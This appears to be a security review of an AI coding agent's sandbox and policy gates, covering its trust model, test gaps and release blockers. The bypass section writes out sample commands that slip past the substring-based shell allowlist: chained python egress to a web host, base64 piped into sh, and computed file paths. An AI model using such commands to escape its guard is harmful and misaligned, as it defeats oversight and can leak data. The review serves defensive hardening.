# Advisor: expansionist — Answer A

## Council answer — upside-hunting boundary review

**Threat model [MATERIALS].** Who is trusted: (1) the remote model — *not* trusted for behavior, only for content; every action is gated locally (`agent.py:2984` `dispatch_tool` runs plan gate → dossier gate → policy gate → ask before any tool). (2) The local user — fully trusted by the current design, and that is the load-bearing assumption: they can edit `agent.py`, the TOML, or point `TAMIAS_BASE_URL` at a friendly gateway. (3) The local Python process — treated as authoritative today; `run_shell` executes `shell=True` with a scrubbed env (`agent.py:1251-1258`). (4) The gateway — trusted, but the agent never checks the manifest signature (`docs/BOUNDED-AGENT.md:146-149`); that's the gateway's job, so a malicious gateway wins by definition. (5) The OS — trusted, i.e., unenforced; RELEASE-STATUS.md:40 admits "OS sandbox: not built, best-effort shell guard only." Confidence: High.

**The one bypass nobody should kid themselves about [MATERIALS + INFERENCE].** The shell guard is lexical, and the shell allowlist is substring-based (`agent.py:2802-2808`: `pattern in command`). Once any allowed family matches, everything after the first `;` inherits the clearance. Concrete claims:

- `git status; python3 -c "import urllib.request,os,glob; urllib.request.urlopen('http://'+ ...)"` [INFERENCE]: matches an allow family, hits no deny token (`http://...` doesn't start with `/`), passes `shell_escapes_company` (lines 1172-1200 scans only literal tokens — no `$()`, backticks, or runtime-computed paths). Arbitrary egress, arbitrary behavior, all inside the "allowed" family. Confidence: High.
- Data-dependent paths: `python3 -c "open(sorted(glob('*'))[0])"` never spells `../` or `/etc` — the token scan can't see it [INFERENCE, High].
- Base64 delegation: `git status; echo cm0... | base64 -d | sh` contains no denied substring [INFERENCE, High].

The repo's own doc concedes this — `BOUNDED-AGENT.md:192-195` calls `run_shell` "the sharp edge." So the framing question's real answer: a *company-set* boundary **can be exceeded today via the shell tool**, and the honest label is "product-level, best-effort at shell," not "company guarantee" [OPINION, High].

**Where company / product / task diverge [INFERENCE, Medium].** The policy enforces company (fence) and product (`allow_write` at toml:53), but *task* scope is only `domain_check` (agent.py:2863-2892) — a lexical gate over request text that the code itself calls "a scope guard, not a security boundary" (line 2873-2874). Reads default company-wide; nothing limits the todo agent to one ticket. Nobody mentioned that the model's own prompt channel is an exfiltration channel: company code is shipped to OpenRouter by design, and no `[network]`/host allowlist exists in `policies/todoinc-todo.toml` even though `BOUNDED-AGENT.md:99-101` sketches one [FACT from materials, gap unverified in code].

**Test evidence: what's proven vs asserted [FACT].** The 374 tests and 17 probes prove the *deterministic gates* behave (deny wins, realpath, fail-closed ask). They prove almost nothing about *adversarial* input — every benign probe passes; no mutation, obfuscation, or multi-step escape is in the suite. The live stage repair (RELEASE-STATUS.md:37) remains unproven per the two-pass rule.

**Missing upside — the cheapest wins sitting right here [OPINION, Medium].** (1) This codebase is *made* for adversarial red-team probes; add ~10 hostile shell probes (delegation, runtime paths, env-expansion, chained after allow-family) to `demo/check_boundary.py` and publish the failures as documented limits. That converts the current silent gap into the project's best sales asset: "here is exactly what our product boundary does *not* claim." (2) The audit JSONL (`agent.py:2952-2958`) is written by the process it audits, with `except OSError: pass` — a hash-chained row is one afternoon and makes the trail tamper-evident, which companies actually buy.

**Demo-blocking vs production-blocking.** Demo-blocking: nothing — the demo is honest if labeled. Production-blocking: shell escape (any), BYO-gateway (RELEASE-STATUS.md:41), unsigned policy hop.

**Verdict on options: B** [OPINION, High] — the dispatcher is a good policy layer; only the kernel below it can make "people should not be able to bypass that" true.

One concrete next step (≤1 day): write and run the 10-probe adversarial shell battery offline, record pass/fail in RELEASE-STATUS.md, and relabel the boundary line accordingly.

One-line verdict: The deterministic gates are genuinely solid; the shell tool is a one-liner bypass away from unrestricted egress, so claim product-level not company-level — and the cheapest upside is weaponizing the known gaps into an adversarial probe suite that proves the boundary's honesty.
